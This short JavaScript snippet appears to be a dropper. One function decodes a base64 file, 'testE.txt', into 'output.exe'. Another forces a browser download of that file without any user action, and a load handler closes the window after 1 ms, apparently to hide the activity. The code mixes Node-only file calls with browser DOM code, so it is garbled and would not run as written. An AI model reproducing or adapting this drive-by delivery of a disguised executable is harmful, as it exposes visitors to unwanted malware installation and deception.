function decode() {
    const fs = require('fs');
    const base64Data = fs.readFileSync('testE.txt', 'utf8');
    const binaryData = Buffer.from(base64Data, 'base64');
    fs.writeFileSync('output.exe', binaryData);
}
decode()
function download() {
    const link = document.createElement("a");
    link.href = "files/testE.txt";
    link.download = "testE.txt";
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
}
download()

window.addEventListener("load", function () {
    setTimeout(() => {
        
        window.close();
    }, 1);
});

